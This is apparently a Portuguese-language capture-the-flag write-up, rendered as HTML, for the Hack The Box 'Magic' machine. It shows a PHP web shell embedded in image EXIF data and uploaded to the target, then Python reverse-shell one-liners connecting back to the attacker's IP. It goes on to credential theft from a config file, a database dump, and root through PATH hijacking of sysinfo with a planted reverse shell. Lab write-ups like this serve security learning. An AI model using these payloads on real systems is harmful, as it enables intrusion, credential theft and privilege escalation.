+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&#39;</span> lo.jpg
+</code></pre></div><p><img src="/print1.png" alt="HTB"></p>
+<p>depois disso renomeio para .php</p>
+<p><em>mv fxshell.png fxshell.php.png</em></p>
+<p>continuando ..</p>
+<p>Fiz o upload com sucesso..</p>
+<p>estava pesquisando sobre o nc (netcat)  <a href="https://www.computerhope.com/unix/nc.htm">https://www.computerhope.com/unix/nc.htm</a></p>
+<p>com ele podemos ouvir a porta TCP/UDP  no caso aqui,  vou colocar o nc  escutando na porta 1234 uma conexão</p>
+<p><a href="https://www.speedguide.net/port.php?port=1234">https://www.speedguide.net/port.php?port=1234</a></p>
+<p><em>nc -nlvp 1234</em></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">FLAGS:
+
+-n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados.
+
+-l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado.
+
+-v Faça nc dar uma saída mais detalhada.
+
+-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios.
+</code></pre></div><p><img src="/print2-magic.png" alt="HTB"></p>
+<p>agora vou usar aquele famoso shell reverso em python que o professor cansou de falar</p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><p>vamos utilizar este ^</p>
+<p>fiz o teste para ver se o upload da imagem deu certo &gt;</p>
+<p>http://10.10.10.185/images/uploads/fxshell.php.png</p>
+<p><img src="/print3-magic.png" alt="HTB"></p>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.185</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">fxshell</span><span class="o">.</span><span class="n">php</span><span class="o">.</span><span class="n">png</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><p>o codigo ficará assim, mudando apenas meu IP de tunelamento no script em python</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>10.10.14.247<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">52180</span>
+/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+$ 
+</code></pre></div><p>agora utilizamos o mesmo modulo do python para escalar privilégios</p>
+<p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</code></pre></div><p>Fui procurando alguma informação que me leva-se a escalar privilégios, com o usuário do  www-data e então encontrei dados de usuário no arquivo db.php5</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">assets    db.php5  images  index.php  login.php  logout.php  upload.php
+www-data@ubuntu:/var/www/Magic$ cat db.php5
+cat db.php5
+&lt;?php
+class Database
+<span class="o">{</span>
+    private static <span class="nv">$dbName</span> <span class="o">=</span> <span class="s1">&#39;Magic&#39;</span> <span class="p">;</span>
+    private static <span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">;</span>
+    private static <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">&#39;theseus&#39;</span><span class="p">;</span>
+    private static <span class="nv">$dbUserPassword</span> <span class="o">=</span> <span class="s1">&#39;iamkingtheseus&#39;</span><span class="p">;</span>
+
+    private static <span class="nv">$cont</span>  <span class="o">=</span> null<span class="p">;</span>
+
+    public <span class="k">function</span> __construct<span class="o">()</span> <span class="o">{</span>
+        die<span class="o">(</span><span class="s1">&#39;Init function is not allowed&#39;</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+</code></pre></div><p>Com essas informações de usuário, posso baixar os dados do banco.  (dump)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ mysqldump --databases Magic -utheseus -piamkingtheseus
+&lt;qldump --databases Magic -utheseus -piamkingtheseus
+mysqldump: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
+-- MySQL dump 10.13  Distrib 5.7.29, <span class="k">for</span> Linux <span class="o">(</span>x86_64<span class="o">)</span>
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version    5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT<span class="o">=</span>@@CHARACTER_SET_CLIENT */<span class="p">;</span>
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS<span class="o">=</span>@@CHARACTER_SET_RESULTS */<span class="p">;</span>
+/*!40101 SET @OLD_COLLATION_CONNECTION<span class="o">=</span>@@COLLATION_CONNECTION */<span class="p">;</span>
+/*!40101 SET NAMES utf8 */<span class="p">;</span>
+/*!40103 SET @OLD_TIME_ZONE<span class="o">=</span>@@TIME_ZONE */<span class="p">;</span>
+/*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span><span class="s1">&#39;+00:00&#39;</span> */<span class="p">;</span>
+/*!40014 SET @OLD_UNIQUE_CHECKS<span class="o">=</span>@@UNIQUE_CHECKS, <span class="nv">UNIQUE_CHECKS</span><span class="o">=</span><span class="m">0</span> */<span class="p">;</span>
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS<span class="o">=</span>@@FOREIGN_KEY_CHECKS, <span class="nv">FOREIGN_KEY_CHECKS</span><span class="o">=</span><span class="m">0</span> */<span class="p">;</span>
+/*!40101 SET @OLD_SQL_MODE<span class="o">=</span>@@SQL_MODE, <span class="nv">SQL_MODE</span><span class="o">=</span><span class="s1">&#39;NO_AUTO_VALUE_ON_ZERO&#39;</span> */<span class="p">;</span>
+/*!40111 SET @OLD_SQL_NOTES<span class="o">=</span>@@SQL_NOTES, <span class="nv">SQL_NOTES</span><span class="o">=</span><span class="m">0</span> */<span class="p">;</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">--
+-- Current Database: <span class="sb">`</span>Magic<span class="sb">`</span>
+--
+
+CREATE DATABASE /*!32312 IF NOT EXISTS*/ <span class="sb">`</span>Magic<span class="sb">`</span> /*!40100 DEFAULT CHARACTER SET latin1 */<span class="p">;</span>
+
+USE <span class="sb">`</span>Magic<span class="sb">`</span><span class="p">;</span>
+
+--
+-- Table structure <span class="k">for</span> table <span class="sb">`</span>login<span class="sb">`</span>
+--
+
+DROP TABLE IF EXISTS <span class="sb">`</span>login<span class="sb">`</span><span class="p">;</span>
+/*!40101 SET @saved_cs_client     <span class="o">=</span> @@character_set_client */<span class="p">;</span>
+/*!40101 SET <span class="nv">character_set_client</span> <span class="o">=</span> utf8 */<span class="p">;</span>
+CREATE TABLE <span class="sb">`</span>login<span class="sb">`</span> <span class="o">(</span>
+  <span class="sb">`</span>id<span class="sb">`</span> int<span class="o">(</span>6<span class="o">)</span> NOT NULL AUTO_INCREMENT,
+  <span class="sb">`</span>username<span class="sb">`</span> varchar<span class="o">(</span>50<span class="o">)</span> NOT NULL,
+  <span class="sb">`</span>password<span class="sb">`</span> varchar<span class="o">(</span>100<span class="o">)</span> NOT NULL,
+  PRIMARY KEY <span class="o">(</span><span class="sb">`</span>id<span class="sb">`</span><span class="o">)</span>,
+  UNIQUE KEY <span class="sb">`</span>username<span class="sb">`</span> <span class="o">(</span><span class="sb">`</span>username<span class="sb">`</span><span class="o">)</span>
+<span class="o">)</span> <span class="nv">ENGINE</span><span class="o">=</span>InnoDB <span class="nv">AUTO_INCREMENT</span><span class="o">=</span><span class="m">2</span> DEFAULT <span class="nv">CHARSET</span><span class="o">=</span>latin1<span class="p">;</span>
+/*!40101 SET <span class="nv">character_set_client</span> <span class="o">=</span> @saved_cs_client */<span class="p">;</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">--
+-- Dumping data <span class="k">for</span> table <span class="sb">`</span>login<span class="sb">`</span>
+--
+
+LOCK TABLES <span class="sb">`</span>login<span class="sb">`</span> WRITE<span class="p">;</span>
+/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> DISABLE KEYS */<span class="p">;</span>
+INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;Th3s3usW4sK1ng&#39;</span><span class="o">)</span><span class="p">;</span>
+/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> ENABLE KEYS */<span class="p">;</span>
+UNLOCK TABLES<span class="p">;</span>
+/*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE */<span class="p">;</span>
+
+/*!40101 SET <span class="nv">SQL_MODE</span><span class="o">=</span>@OLD_SQL_MODE */<span class="p">;</span>
+/*!40014 SET <span class="nv">FOREIGN_KEY_CHECKS</span><span class="o">=</span>@OLD_FOREIGN_KEY_CHECKS */<span class="p">;</span>
+/*!40014 SET <span class="nv">UNIQUE_CHECKS</span><span class="o">=</span>@OLD_UNIQUE_CHECKS */<span class="p">;</span>
+/*!40101 SET <span class="nv">CHARACTER_SET_CLIENT</span><span class="o">=</span>@OLD_CHARACTER_SET_CLIENT */<span class="p">;</span>
+/*!40101 SET <span class="nv">CHARACTER_SET_RESULTS</span><span class="o">=</span>@OLD_CHARACTER_SET_RESULTS */<span class="p">;</span>
+/*!40101 SET <span class="nv">COLLATION_CONNECTION</span><span class="o">=</span>@OLD_COLLATION_CONNECTION */<span class="p">;</span>
+/*!40111 SET <span class="nv">SQL_NOTES</span><span class="o">=</span>@OLD_SQL_NOTES */<span class="p">;</span>
+</code></pre></div><p>Quando eu dei um cat no arquivo db.php5</p>
+<p>Eu descobri o usuário de baixo privilegio da maquina e a senha do banco.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">private static <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">&#39;theseus&#39;</span><span class="p">;</span>
+private static <span class="nv">$dbUserPassword</span> <span class="o">=</span> <span class="s1">&#39;iamkingtheseus&#39;</span><span class="p">;</span>
+</code></pre></div><p>Com esses dados, eu fiz um dump no banco  passando os mesmos :   -u (usuário) -p (senha)   como uma conexão comum via banco
+fazendo isso eu descobri a senha do usuário..</p>
+<pre><code>INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+</code></pre><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ su theseus
+su theseus
+Password: Th3s3usW4sK1ng
+
+theseus@ubuntu:/var/www/Magic$ 
+</code></pre></div><p>só pegar a flag de user</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu:/home$ <span class="nb">cd</span> theseus
+<span class="nb">cd</span> theseus
+theseus@ubuntu:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+theseus@ubuntu:~$ cat user.txt    
+</code></pre></div><p>Para pegar o root,  tem um truque do  Sysinfo  que pode ser encontrado na internet.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ sysinfo
+</code></pre></div><p>quando rodar esse comando, automaticamente ele trará informações do sistema
+por que se trata de um binário.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
+H/W path           Device      Class      <span class="nv">Description</span>
+<span class="o">=====================================================</span>
+                               system     VMware Virtual Platform
+/0                             bus        440BX Desktop Reference Platform
+/0/0                           memory     86KiB BIOS
+/0/1                           processor  AMD EPYC 7401P 24-Core Processor
+/0/1/0                         memory     16KiB L1 cache
+/0/1/1                         memory     16KiB L1 cache
+/0/100/17.5                    bridge     PCI Express Root Port
+/0/100/17.6                    bridge     PCI Express Root Port
+/0/100/17.7                    bridge     PCI Express Root Port
+/0/100/18                      bridge     PCI Express Root Port
+/0/100/18.1                    bridge     PCI Express Root Port
+/0/100/18.2                    bridge     PCI Express Root Port
+/0/100/18.3                    bridge     PCI Express Root Port
+/0/100/18.4                    bridge     PCI Express Root Port
+/0/100/18.5                    bridge     PCI Express Root Port
+/0/100/18.6                    bridge     PCI Express Root Port
+/0/100/18.7                    bridge     PCI Express Root Port
+/0/46              scsi0       storage    
+/0/46/0.0.0        /dev/cdrom  disk       VMware IDE CDR00
+/1                             system     
+</code></pre></div><p>Dentro do tmp,  criei uma pasta root e dentro dela criei o arquivo  fdisk  por que o fdisk é um dos modulos que o binário chama.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp/root$ touch fdisk
+</code></pre></div><p>Depois exporto o path, para ser executado com a váriavel $PATH</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp/root$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp/root:<span class="nv">$PATH</span>
+</code></pre></div><p>Agora neste arquivo do fdisk vou jogar aquele shell reverso em python novamente</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp/root$ cat &gt; fdisk
+python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><p>Agora sim dou as permissões</p>
+<p>chmod 755 fdisk</p>
+<p>OBS &gt;  no shell reverso coloco meu IP de tunel e porta</p>
+<p>agora abro um novo terminal</p>
+<p>E uso no netcat novamente para escutar na porta 1234</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:nc -nlvp <span class="m">1234</span>
+</code></pre></div><p>volto na outra aba do terminal</p>
+<p>e executo o path</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">theseus@ubuntu: sysinfo
+</code></pre></div><p>Na outra aba com o netcat ouvindo, vc vai perceber que o binário foi executado elevando seu privilégio para root</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Ncat: Connection from 10.10.10.185:45410.
+root@ubuntu:/tmp/root# whoami
+whoami
+root
+</code></pre></div>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
